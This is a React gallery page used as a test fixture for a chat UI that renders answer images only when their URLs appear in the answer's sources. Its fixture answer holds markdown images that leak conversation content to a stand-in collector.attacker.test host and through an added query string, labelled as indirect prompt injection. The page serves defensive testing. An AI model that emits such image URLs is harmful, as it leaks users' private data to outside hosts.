"use client";

/// 回答の画像の出所チェックのギャラリー（#1005・PIT-77・デザイン確認と E2E 用）。
///
/// 認証・LLM 不要（middleware は /reference を除外）。実部品（MessageTimeline）に固定フィクスチャを流す。
/// web_fetch が返したページに現れた画像は描き、LLM が組み立てた URL（会話の中身を載せたもの）は
/// 読み込まずにリンクにする。画像のホストは `.test`（実在しない）なので、E2E は要求を横取りして応答する。

import * as React from "react";

import { MessageTimeline, type TimelineSegment } from "@/components/chat/message-timeline";

/// web_fetch がページの本文に残す画像（Markdown の画像記法）。
const PAGE_IMAGE = "https://images.example.test/market/saas-share-2026.png";

/// 出典に現れた画像と、出典に無い画像を混ぜた回答。
const ANSWER = [
  "国内 SaaS 市場の内訳は、調査会社の公開資料に次の図があります。",
  "",
  `![SaaS 市場の分野別シェア](${PAGE_IMAGE})`,
  "",
  "業務アプリが最大で、全体の約 4 割を占めます。",
  "",
  // 出典の画像の URL に、会話の中身をクエリとして足したもの（出典と字句が一致しない）。
  `![補足の図](${PAGE_IMAGE}?q=%E4%BC%9A%E8%AD%B0%E3%81%AE%E8%A6%81%E7%B4%84)`,
  "",
  // 出典に一度も現れない外部ホスト（間接プロンプトインジェクションの典型）。
  "参考: ![](https://collector.attacker.test/p?d=Q3%20revenue%2012.4B) 以上が要点です。",
].join("\n");

const SEGMENTS: TimelineSegment[] = [
  {
    kind: "work",
    key: "w0",
    thinking: "",
    tools: [
      {
        key: "f1",
        id: "f1",
        name: "web_fetch",
        running: false,
        ok: true,
        step: 0,
        input: { url: "https://research.example.test/saas-2026" },
        result: [
          "HTTP 200 | text/html | https://research.example.test/saas-2026 | 本文 820 字",
          "<web_page>",
          "# 国内 SaaS 市場 2026",
          "",
          "分野別のシェアは次のとおり。",
          "",
          `![分野別シェア](${PAGE_IMAGE} "図 1")`,
          "",
          "業務アプリ 41%、情報系 27%、その他 32%。",
          "</web_page>",
        ].join("\n"),
      },
    ],
  },
  { kind: "text", key: "t1", text: ANSWER },
];

export default function AnswerImagesGalleryPage() {
  return (
    <main className="mx-auto max-w-3xl space-y-8 p-6">
      <header>
        <h1 className="text-lg font-semibold tracking-tight">回答の画像</h1>
        <p className="mt-1 text-[13px] text-muted-foreground">
          回答に描く画像は、その回答の出典（ツール結果・引用）に現れた URL だけ。出典に無い画像は読み込まず、
          行き先のホストを添えたリンクにする（#1005）。
        </p>
      </header>
      <section data-testid="answer-images-timeline" className="min-w-0 rounded-xl border border-border px-6 py-5">
        <MessageTimeline segments={SEGMENTS} citations={[]} />
      </section>
    </main>
  );
}
